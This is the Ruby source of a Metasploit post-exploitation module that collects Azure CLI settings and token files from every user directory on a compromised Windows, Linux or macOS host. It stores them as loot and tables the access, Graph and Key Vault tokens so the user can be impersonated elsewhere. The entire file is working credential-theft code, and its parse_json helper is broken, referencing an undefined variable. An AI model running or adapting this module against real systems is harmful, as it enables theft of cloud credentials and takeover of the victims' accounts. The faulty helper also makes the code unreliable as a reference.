##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Azure

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather Azure CLI Credentials',
        'Description' => %q{
          This module will collect the Azure CLI 2.0 (az cli) settings files
          for all users on a given target. These configuration files contain
          JWT tokens used to authenticate users and other subscription information.
          Once tokens are stolen from one host, they can be used to impersonate
          the user from a different host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'James Otten <jamesotten1[at]gmail.com>', # original author
          'h00die' # additions
        ],
        'Platform' => ['win', 'linux', 'osx'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def parse_json(data)
    json_blob = nil
    options = { invalid: :replace, undef: :replace, replace: '' }
    str.encode(Encoding.find('ASCII'), options)
    begin
      json_blob = JSON.parse(data)
    rescue ::JSON::ParserError
      print_error('Unable to parse json blob')
    end
    json_blob
  end

  def user_dirs
    user_dirs = []
    if session.platform == 'windows'
      grab_user_profiles.each do |profile|
        user_dirs.push(profile['ProfileDir'])
      end
    elsif session.platform == 'linux' || session.platform == 'osx'
      user_dirs = enum_user_directories
    else
      fail_with(Failure::BadConfig, 'Unsupported platform')
    end
    user_dirs
  end

  def run
    subscription_table = Rex::Text::Table.new(
      'Header' => 'Subscriptions',
      'Indent' => 1,
      'Columns' => ['Source', 'Account Name', 'Username', 'Cloud Name']
    )
    tokens_table = Rex::Text::Table.new(
      'Header' => 'Tokens',
      'Indent' => 1,
      'Columns' => ['Source', 'Username', 'Count']
    )
    context_table = Rex::Text::Table.new(
      'Header' => 'Context',
      'Indent' => 1,
      'Columns' => ['Username', 'Account Type', 'Access Token', 'Graph Access Token', 'MS Graph Access Token', 'Key Vault Token']
    )

    user_dirs.map do |user_directory|
      vprint_status("Looking for az cli data in #{user_directory}")
      # leaving all these as lists for consistency and future expansion

      # ini file content, not json.
      vprint_status('  Checking for config files')
      %w[.azure/config].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)
        next unless readable?(possible_location)

        data = read_file(possible_location)
        next unless data

        # https://stackoverflow.com/a/16088751/22814155 no ini ctype
        loot = store_loot 'azure.config.ini', 'text/plain', session, data, file_location, 'Azure CLI Config'
        print_good "    #{file_location} stored in #{loot}"
      end

      vprint_status('  Checking for context files')
      %w[.azure/AzureRmContext.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)
        next unless readable?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.context.json', 'text/json', session, data, file_location, 'Azure CLI Context'
        print_good "    #{file_location} stored in #{loot}"
        data = parse_json(data)
        results = process_context_contents(data)
        results.each do |result|
          context_table << result
        end
      end

      %w[.azure/accessTokens.json .azure/azureProfile.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        vprint_status("Found az cli file #{possible_location}")
        if file_location.end_with?('accessTokens.json')
          loot_type = 'azurecli.jwt_tokens'
          description = 'Azure CLI access/refresh JWT tokens'
          process_tokens_file(possible_location, data).each do |item|
            tokens_table << item
          end
        elsif file_location.end_with?('config')
          loot_type = 'azurecli.config'
          description = 'Azure CLI configuration'
        elsif file_location.end_with?('azureProfile.json')
          loot_type = 'azurecli.azure_profile'
          description = 'Azure CLI profile'
          process_profile_file(possible_location, data).each do |item|
            subscription_table << item
          end
        end
        stored = store_loot(loot_type, 'text/plain', session, data, file_location, description)
        print_good("#{possible_location} stored to #{stored}")
      end
    end

    print_good(subscription_table.to_s) unless subscription_table.rows.empty?
    print_good(tokens_table.to_s) unless tokens_table.rows.empty?
    print_good(context_table.to_s) unless context_table.rows.empty?
  end
end
